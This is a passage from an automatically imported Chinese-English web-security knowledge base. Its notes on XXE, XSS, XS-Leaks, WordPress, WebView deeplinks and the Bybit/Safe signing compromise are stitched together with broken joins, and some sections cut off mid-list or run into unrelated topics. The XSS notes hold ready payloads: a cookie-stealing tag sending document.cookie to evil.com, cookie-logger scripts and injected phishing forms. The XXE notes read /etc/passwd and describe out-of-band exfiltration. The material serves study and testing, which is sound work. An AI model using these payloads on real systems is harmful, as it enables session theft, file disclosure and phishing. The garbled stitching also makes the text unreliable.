While proxies are expected to remove these headers, not all do, creating potential vulnerabilities. Abusing hop-by-hop headers can lead to various security implications. Below are a couple of examples demonstrating how these headers can be manipulated for potential attacks: Attack Scenario: The attacker sends an HTTP request to a web application behind a proxy, including a fake IP address in the X-Forwarded-For header. The attacker also includes the Connection: close, X-Forwarded-For header, prompting the proxy to treat X-Forwarded-For as hop-by-hop. The misconfigured proxy forwards the request to the web application without the spoofed X-Forwarded-For header. # 工具与参考入口 https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers RFC 2616 # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

For Windows you could try to read: C:\windows\system32\drivers\etc\hosts In Java based applications it might be possible to list the contents of a directory via XXE with a 载荷 like (just asking for the directory instead of the file): Using the previously commented technique you can make the server access a server you control to show it's vulnerable. But, if that's not working, maybe is because XML entities aren't allowed, in that case you could try using XML parameter entities: An XML parameter entity, %file, is created, reading the content of the /etc/hostname file. Another XML parameter entity, %eval, is defined. It dynamically declares a new XML parameter entity, %exfiltrate. The %exfiltrate entity is set to make an HTTP request to the attacker's server, passing the content of the %file entity within the query string of the URL. XXE 载荷: To 利用 a vulnerable application, the attacker sends an XXE 载荷: A redefinition occurs for the custom entity XML parameter entity, originally defined in the external DTD, to encapsulate an error-based XXE 利用. This redefinition is designed to elicit a parsing error, exposing the contents of the /etc/passwd file. By employing the local dtd entity, the external DTD is engaged, encompassing the newly defined custom entity. This sequence of actions precipitates the emission of the error message aimed for by the 利用. Note the first line of the read file or of the result of the execution will appear INSIDE the created image. So you need to be able to access the image SVG has created. Reads the target file (<!ENTITY % flag SYSTEM "file:///tmp/flag.txt">). Out-of-band callbacks reliably confirm 利用. # 命令 / 载荷 / 操作片段 # 1. New Entity test 123456<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY toreplace "3"> ]><stockCheck> <productId>&toreplace;</productId> <storeId>1</storeId></stockCheck> # 2. title: XSS 技术笔记
content: 来源路径： 02-知识点/Web安全/XSS 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # XSS 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 XSS 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 XSS 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：XSS、XSS 简介、反射型 XSS、持久型 XSS、DOM XSS；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 XSS XSS 简介 反射型 XSS 持久型 XSS DOM XSS XSS 利用方式 Cookies 窃取 会话劫持 钓鱼 网页挂马 DOS 与 DDOS XSS 蠕虫 Self-XSS 变废为宝的场景 # 核心要点 跨站脚本（跨站脚本 XSS，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。 此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。 由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。 # 命令 / 载荷 / 操作片段 # 1. 反射型 XSS 1234567<?php// Is there any input?if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { // Feedback for end user echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';}?> # 2. 持久型 XSS 123456789101112131415<?php if( isset( $_POST[ 'btnSign' ] ) ) { // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); //mysql_close(); }?> # 3. DOM XSS 12345678<html> <head> <title>DOM-XSS test</title> </head> <body> </body></html> # 4. DOM XSS 1http://127.0.0.1/domXSS.html?a= # 5. Cookies 窃取 1<img src="http://www.evil.com/cookie.asp?cookie="+document.cookie></img> # 6. Cookies 窃取 123456789<% msg=Request.ServerVariables("QUERY_STRING") testfile=Server.MapPath("cookie.txt") set fs=server.CreateObject("Scripting.filesystemobject") set thisfile=fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(""&msg& "") thisfile.close set fs=nothing%> # 7. Cookies 窃取 123456<?php$cookie = $_GET['cookie'];$log = fopen("cookie.txt", "a");fwrite($log, $cookie . "\n");fclose($log);?> # 8. 钓鱼 1http://www.bug.com/index.php?search="'> # 9. 钓鱼 1http://www.bug.com/index.php?search="'<html><head><title>login</title></head><body><div style="text-align:center;"><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br/><input name="login" /><br />Password:<br/><input name="Password" type="password" /><br/><br/><input name="Valid" value="Ok" type="submit" /><br/></form></div></body></html> # 10. 钓鱼 1http://www.bug.com/index.php?search='><iframe src="http://www.evil.com" height="100%" width="100%"</iframe> # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 XSS 跨站脚本 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/XS-Search-XS-Leaks 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # XS-Search-XS-Leaks 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 XS-Search-XS-Leaks 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 XS-Search-XS-Leaks 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：XS-Search/XS-Leaks、Basic Information、Detectable Differences、Inclusion Methods、Leak Techniques；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 XS-Search/XS-Leaks Basic Information Detectable Differences Inclusion Methods Leak Techniques XSinator Tool & Paper Timing Based techniques Event Handler Techniques Onload/Onerror Onload Timing Onload Timing + Forced Heavy Task unload/beforeunload Timing Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a> #ID + error + onload Javascript Execution CORB：Onerror onblur postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a> # 核心要点 XS-Search is a method used for extracting cross-origin information by leveraging side channel vulnerabilities. Key components involved in this attack include: Vulnerable Web: The target website from which information is intended to be extracted. Attacker's Web: The malicious website created by the attacker, which the victim visits, hosting the 利用. Inclusion Method: The technique employed to incorporate the Vulnerable Web into the Attacker's Web (e.g., window.open, iframe, fetch, HTML tag with href, etc.). Leak Technique: Techniques used to discern differences in the state of the Vulnerable Web based on information gathered through the inclusion method. States: The two potential conditions of the Vulnerable Web, which the attacker aims to distinguish. Detectable Differences: Observable variations that the attacker relies on to infer the state of the Vulnerable Web. Redirects: Detecting navigations to different pages, not just HTTP redirects but also those triggered by JavaScript or HTML. Frames: Elements such as iframe, object, and embed can embed HTML resources directly into the attacker's page. If the page lacks framing protection, JavaScript can access the framed resource’s window object via the contentWindow property. Global State: Detectable interactions with browsers' global states (e.g., the History interface) can be exploited. For instance, the number of entries in a browser's history can offer clues about cross-origin pages. Readable Attributes: Some HTML attributes are readable cross-origin and can be used as a leak technique. For instance, the window.frame.length property allows JavaScript to count the frames included in a webpage cross-origin. Detectable Difference: Status Code More info: https://www.usenix.org/conference/usenixsecurity19/presentation/staicu, https://xsleaks.dev/docs/attacks/error-events/ # 命令 / 载荷 / 操作片段 # 1. Onload/Onerror 123<object data="//example.com/404"> <object data="//attacker.com/?error"></object></object> # 2. Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a> 1// Example of an iframe with the sandbox attribute # 3. History Length with same URL 123456789101112131415async function debug(win, url) { win.location = url + "#aaa" win.location = "about:blank" await new Promise((r) => setTimeout(r, 500)) return win.history.length}win = window.open("https://example.com/?a=b")await new Promise((r) => setTimeout(r, 2000))console.log(await debug(win, "https://example.com/?a=c"))win.close()win = window.open("https://example.com/?a=b")await new Promise((r) => setTimeout(r, 2000))console.log(await debug(win, "https://example.com/?a=b")) # 4. Image Lazy Loading 1<img src=/something loading=lazy > # 5. Scroll-to-text-fragment 1#:~:text=SECR # 6. CSS ReDoS 123$( "*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']") # 工具与参考入口 https://github.com/cure53/HTTPLeaks https://xsinator.com/paper.pdf https://xsinator.com/ performance.now() Broadcast Channel API Message Channel API requestAnimationFrame setTimeout https://xsleaks.dev/docs/attacks/timing-attacks/clocks https://www.usenix.org/conference/usenixsecurity19/presentation/staicu https://xsleaks.dev/docs/attacks/error-events/ https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events performance.now() PerformanceLongTaskTiming API https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events SharedArrayBuffer clock unload beforeunload Framing Protections sandbox # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 侦察枚举流水

Cache Leak (CORS))：Detect resources loaded by page. Cache is deleted with CORS error. Cache Leak (POST))：Detect resources loaded by page. Cache is deleted with a POST request. ContentDocument X-Frame Leak：Detect X-Frame-Options with ContentDocument. COOP Leak：Detect Cross-Origin-Opener-Policy header with popup. CORB Leak：Detect X-Content-Type-Options in combination with specific content type using CORB. CORP Leak：Detect Cross-Origin-Resource-Policy header with fetch. CSP Directive Leak：Detect CSP directives with CSP iframe attribute. CSP Redirect 检测：Detect cross-origin redirects with CSP violation event. 下载 检测：Detect downloads (Content-Disposition header). Duration Redirect Leak：Detect cross-origin redirects by checking the duration. ETag header length：Detect response body size with ETag header length Event Handler Leak (Object))：Detect errors with onload/onerror with object. # 命令 / 载荷 / 操作片段 # 1. Frame Counting 12345678// Get a reference to the windowvar win = window.open('https://example.org');// Wait for the page to loadsetTimeout(() => { // Read the number of iframes loaded console.log("%d iframes detected", win.length);}, 2000); # 工具与参考入口 RUB-NDS/xsinator.com RUB-NDS/AutoLeak [Cache Leak (CORS)](https://xsinator.com/testing.html#Cache Leak (CORS) [Cache Leak (POST)](https://xsinator.com/testing.html#Cache Leak (POST) ContentDocument X-Frame Leak COOP Leak CORB Leak CORP Leak CORS Error Leak CSP Directive Leak CSP Redirect 检测 CSP Violation Leak CSS Property Leak Disk cache grooming 下载 检测 Duration Redirect Leak ETag header length [Event Handler Leak (Object)](https://xsinator.com/testing.html#Event Handler Leak (Object) [Event Handler Leak (Script)](https://xsinator.com/testing.html#Event Handler Leak (Script) [Event Handler Leak (Stylesheet)](https://xsinator.com/testing.html#Event Handler Leak (Stylesheet) # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

XML entities can be used to tell the XML parser to fetch specific content on the server. staaldraad/xxeftp：A mini webserver with FTP support for XXE 载荷 lc/230-OOB：An Out-of-Band XXE server for retrieving file contents over FTP and 载荷 generation via http://XXE.sh/ enjoiz/XXEinjector：Tool for automatic 利用 of XXE 漏洞 using direct and different out of band methods BuffaloWill/oxml XXE：A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF) whitel1st/docem：Utility to embed XXE and XSS 载荷 in docx,odt,pptx,etc GoSecure/dtd-finder：List DTDs and generate XXE 载荷 using those local DTDs. 载荷 to trigger the XXE: Reading Byte Order Mark (BOM) Reading first symbols of document Example: We can convert the 载荷 to UTF-16 using iconv to 绕过 some WAF: # 命令 / 载荷 / 操作片段 # 1. Classic XXE 1234<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo> # 5. Classic XXE Base64 Encoded 1<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/> # 8. content: 来源路径： 02-知识点/Web安全/Wordpress 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Wordpress 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Wordpress 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Wordpress 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Wordpress、Basic Information、Main WordPress Files、Users Permissions、Passive 枚举；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 36 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Wordpress Basic Information Main WordPress Files Users Permissions Passive 枚举 Get WordPress version Get Plugins Get Themes Extract versions in general Active 枚举 Plugins and Themes Users XML-RPC wp-cron.php DoS /wp-json/oembed/1.0/proxy：SSRF SSRF Automatic 工具 Get access by overwriting a bit # 核心要点 Uploaded files go to: http://10.10.10.10/wp-content/uploads/2018/08/a.txt In wp-config.php you can find the root 密码 of the database. wp-content/uploads/ Is the directory where any files uploaded to the platform are stored. wp-includes/ This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets. 后渗透 Contributor: Write and manage his posts but cannot publish them Login username 枚举: When login in /wp-login.php the message is different is the indicated username exists or not. 凭据 Bruteforce wp.getUserBlogs, wp.getCategories or metaWeblog.getUsersBlogs are some of the methods that can be used to brute-force 凭据. If you can find any of them you can send something like: DDoS or port scanning Modifying a php from the theme used (admin 凭据 needed) Navigate to the WordPress dashboard, then go to Dashboard > Plugins > 上传 Plugin. 上传 the zip file of the downloaded plugin. With the plugin "reflex-gallery" installed and activated, it can be exploited as it is known to be vulnerable. # 命令 / 载荷 / 操作片段 # 1. This guide highlights key configurations and security practices to mitigate risks associated with WebView usage. Universal Access From File URLs: This deprecated feature allowed cross-origin requests from file URLs, posing a significant security risk due to potential XSS attacks. The default setting is disabled (false) for apps targeting Android Jelly Bean and newer. Ofc, a potential attacker should never be able to control the URL that an application is going to load. JavaScript: Disabled by default in WebViews, it can be enabled via setJavaScriptEnabled(). Caution is advised as enabling JavaScript without proper safeguards can introduce security vulnerabilities. Intent Scheme: WebViews can handle the intent scheme, potentially leading to exploits if not carefully managed. An example 漏洞 involved an exposed WebView parameter "support url" that could be exploited to execute 跨站脚本 XSS (XSS) attacks. 利用 example using adb: Extreme caution is required for apps targeting Android versions below 4.2 due to a 漏洞 allowing remote code execution through malicious JavaScript, exploiting reflection. Potential 利用 through JavaScript, for instance, via an XSS attack, enables the calling of exposed Java methods: To mitigate risks, restrict JavaScript bridge usage to code shipped with the APK and prevent loading JavaScript from remote sources. For older devices, set the minimum API level to 17. A documented method allows achieving RCE through reflection by executing a specific 载荷. However, the @JavascriptInterface annotation prevents unauthorized method access, limiting the attack surface. Inconsistent normalization: helpers split/rebuild the URL differently than the final check, creating mismatches a malicious URL can 利用. Craft deep-link 载荷 that pass early checks and reach the WebView configuration site. In Chrome DevTools (chrome://inspect), type the bridge object name in the Console (e.g., xbridge) to enumerate exposed fields/methods; look for a generic dispatcher like invokeMethod. It does not prove that the URL is expected, safe, or owned by the right app. If the attacker controls the URL, this code still turns untrusted web input into an external-app launch. WKScriptMessageHandler methods receiving url, target, redirect, openExternal, browser, share, or 下载 Web content reaching a browser's own internal deeplink scheme can 绕过 safety checks that were only designed for normal http (s) navigation. If the app registers a custom resource scheme with setURLSchemeHandler( :forURLScheme:), every request for that scheme is served by native code. Treat it as a local attack surface: Remote pages referencing the internal scheme to reach privileged resources A URL arrives from a WebView navigation, DOM message, query parameter, QR 载荷，push 载荷，or remote config. HTML-injection navigations: meta refresh, <img onerror>, <svg onload> Custom schemes are never used as bearer - 令牌 transports. # 命令 / 载荷 / 操作片段 # 1. Web content controls the next navigation 123<meta http-equiv="refresh" content="0; url=myapp://debug?action=test"><img src=x onerror="window.location='myapp://debug?action=test'"><svg onload="window.location='myapp://debug?action=test'"></svg> # 2. canOpenURL used as if it were validation 123if UIApplication.shared.canOpenURL(url) { UIApplication.shared.open(url)} # 3. WKNavigationDelegate or JS bridges open arbitrary URLs 123456func webView(_ webView: WKWebView, decidePolicyFor action: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) { guard let url = action.request.url else { return decisionHandler(.cancel) } UIApplication.shared.open(url) decisionHandler(.cancel)} # 4. Static triage 1rg -n 'UIApplication\.shared\.open|canOpenURL|setURLSchemeHandler|WKURLSchemeHandler|decidePolicyFor|createWebViewWith|WKScriptMessageHandler|x-success|x-error|x-cancel|redirect|openExternal' . # 5. Static triage 123plutil -p Payload/App.app/Info.plist | rg 'CFBundleURLTypes|LSApplicationQueriesSchemes'rabin2 -zzq Payload/App.app/AppBinary | \ rg 'openURL|canOpenURL|decidePolicyForNavigationAction|createWebViewWith|WKURLSchemeHandler|setURLSchemeHandler|loadFileURL:allowingReadAccessToURL:|loadHTMLString:baseURL:|x-success|x-error|x-cancel|shortcuts://|firefox://|focus://' # 6. Dynamic analysis 123456789# Replay custom-scheme URLs on the simulatorxcrun simctl openurl booted 'myapp://debug?action=test'# Trace common sinksfrida-trace -U 'TargetApp' \ -m '*[UIApplication canOpenURL:*]' \ -m '*[UIApplication openURL:*]' \ -m '*[WKWebView *loadFileURL*]' \ -m '*[WKWebView *loadHTMLString*]' # 7. Dynamic analysis 123456Interceptor.attach(ObjC.classes.UIApplication["- canOpenURL:"].implementation, { onEnter(args) { console.log("[canOpenURL] " + new ObjC.Object(args[2]).absoluteString()); }});Interceptor.attach(ObjC.classes.UIApplication["- openURL:options:completionHandler:"].implementation, { onEnter(args) { console.log("[open] " + new ObjC.Object(args[2]).absoluteString()); }}); # 工具与参考入口 https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/ https://denniskniep.github.io/posts/13 - 绕过 - cve-2024-9956/ # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

This value is not for 认证 but to confirm that the response is not generated by a misconfigured server or cache. The Sec-WebSocket-Accept header in the server's response is a 哈希 of the Sec-WebSocket-Key, verifying the server's intention to open a WebSocket connection. If you find that clients are connected to a HTTP websocket from your current local network you could try an ARP Spoofing Attack to perform a MitM attack between the client and the server.\ You can use the tool https://github.com/PalindromeLabs/STEWS to discover, fingerprint and search for known vulnerabilities in websockets automatically. The burp extension Backslash Powered Scanner now allows to fuzz also WebSocket messages. You can read more infromation abou this here. After you overwrite the stub, sanitized message content becomes the JavaScript handler for onerror, so adding a new message with text like alert(1337) yields <img src=1 onerror=alert(1337)> and executes immediately in the DOM. Use typed views like Module.HEAPU8 to read/write WASM memory from the console. The sanitizer only protects the source string; by corrupting the sink (the HTML template), sanitized input becomes the JS handler value and executes when inserted into the DOM. realloc()-driven adjacency plus unchecked memcpy in edit flows enables pointer corruption to redirect writes to attacker-chosen addresses within linear memory. Other common WASM pitfalls: out-of-bounds writes/reads in linear memory, UAF on heap objects, function-table misuse with unchecked indirect call indices, and JS↔WASM glue mismatches. Avoid trusting URL-embedded state for privileged flows. # 命令 / 载荷 / 操作片段 # 1. title: Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover 技术笔记
content: 来源路径： 02-知识点/Web安全/Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover、Overview、Off-chain: Targeted signing mutation in Safe {Wallet}、Attack properties、Gateway validation relevance；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover Overview Off-chain: Targeted signing mutation in Safe Attack properties Gateway validation relevance 2025 Bybit/Safe incident highlights On-chain: Delegatecall proxy takeover via slot collision Guard & version notes (post-incident hardening) 检测 & hardening checklist # 核心要点 If a dApp can inject code into the signing path, it can make a signer produce a valid EIP-712 signature over attacker-chosen fields while restoring the original UI data so other signers remain unaware. Safe proxies store masterCopy (implementation) at storage slot 0. A delegatecall to a contract that writes to slot 0 effectively “upgrades” the Safe to attacker logic, yielding full control of the wallet. A tampered Safe bundle ( app-*.js) selectively attacked specific Safe + signer addresses. The injected logic executed right before the signing call: Context-gated: hard-coded allowlists for victim Safes/signers prevented noise and lowered 检测. Last-moment mutation: fields (to, data, operation, gas) were overwritten immediately before signTransaction, then reverted, so proposal 载荷 in the UI looked benign while signatures matched the attacker 载荷. The February 21, 2025 Bybit cold-wallet drain (~401k ETH) reused the same pattern: a compromised Safe S3 bundle only triggered for Bybit signers and swapped operation=0 → 1, pointing to at a pre-deployed attacker contract that writes slot 0. Server-side 哈希 checks: gateways/services that relay proposals must recompute safeTxHash and validate signatures match the submitted fields. # 命令 / 载荷 / 操作片段 # 1. Off-chain: Targeted signing mutation in Safe 12345678910111213// Pseudocode of the malicious floworig = structuredClone(tx.data);if (isVictimSafe && isVictimSigner && tx.data.operation === 0) { tx.data.to = attackerContract; tx.data.data = "0xa9059cbb..."; // ERC-20 transfer selector tx.data.operation = 1; // delegatecall tx.data.value = 0; tx.data.safeTxGas = 45746; const sig = await sdk.signTransaction(tx, safeVersion); sig.data = orig; // restore original before submission tx.data = orig; return sig;} # 2. On-chain: Delegatecall proxy takeover via slot collision 12345// Decompiler view (storage slot 0 write)uint256 stor0; // slot 0function transfer(address _to, uint256 _value) external { stor0 = uint256(uint160(_to));} # 工具与参考入口 AnChain.AI forensic breakdown of the Bybit Safe 利用 Zero Hour Technology analysis of the Safe bundle compromise In-depth technical analysis of the Bybit hack (NCC Group) EIP-712 safe-client-gateway (GitHub) # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

XSCH 123<cross-domain-policy> <allow-access-from domain=“*”/></cross-domain-policy> # 工具与参考入口 WEB 渗透 Wiki # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 SQL 注入 XSS 跨站脚本 SSRF 服务端请求伪造 文件上传与文件包含 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/Web Vulnerabilities 方法论.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Web Vulnerabilities 方法论 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Web Vulnerabilities 方法论 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Web Vulnerabilities 方法论 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Proxies、User input、Reflected Values、Search functionalities、Forms, WebSockets and PostMsgs；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 Proxies User input Reflected Values Search functionalities Forms, WebSockets and PostMsgs Cross-site WebSocket hijacking & localhost abuse HTTP Headers Bypasses Structured objects / Specific functionalities Files External Identity Management Other Helpful Vulnerabilities Web Servers & Middleware Application Frameworks & Stacks CMS, SaaS & Managed Platforms APIs, Buckets & Integrations Supply Chain & Identifier Abuse Web3, Extensions & Tooling # 核心要点 In every Web Pentest, there are several hidden and obvious places that might be vulnerable. This post is meant to be a checklist to confirm that you have searched for vulnerabilities in all the possible places. Nowadays web applications usually uses some kind of intermediary proxies, those may be (ab) used to 利用 vulnerabilities. These vulnerabilities need a vulnerable proxy to be in place, but they usually also need some extra 漏洞 in the backend. XSLT Server Side Injection Proxy / WAF Protections 绕过 Depending on the structure of the data the server is expecting some vulnerabilities may or may not apply. If the introduced data may somehow be reflected in the response, the page might be vulnerable to several issues. Client Side Template Injection 命令注入 服务端模板注入 SSTI NoSQL 注入 LDAP 注入 SQL 注入 ORM Injection RSQL Injection # 工具与参考入口 When WebSockets Lead to RCE in CurseForge # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/Web Tool：WFuzz 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Web Tool：WFuzz 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Web Tool：WFuzz 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Web Tool：WFuzz 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Web Tool：WFuzz、Installation、Filtering options、Output options、Encoders options；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 18 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Web Tool：WFuzz Installation Filtering options Output options Encoders options 速查 Login Form bruteforce POST, Single list, filter string (hide) POST, 2 lists, filter code (show) GET, 2 lists, filter string (show), proxy, cookies Bruteforce Directory/RESTful bruteforce Path Parameters BF Header 认证 Basic, 2 lists, filter string (show), proxy NTLM, 2 lists, filter string (show), proxy Cookie/Header bruteforce (vhost brute) Cookie, filter code (show), proxy User-Agent, filter code (hide), proxy # 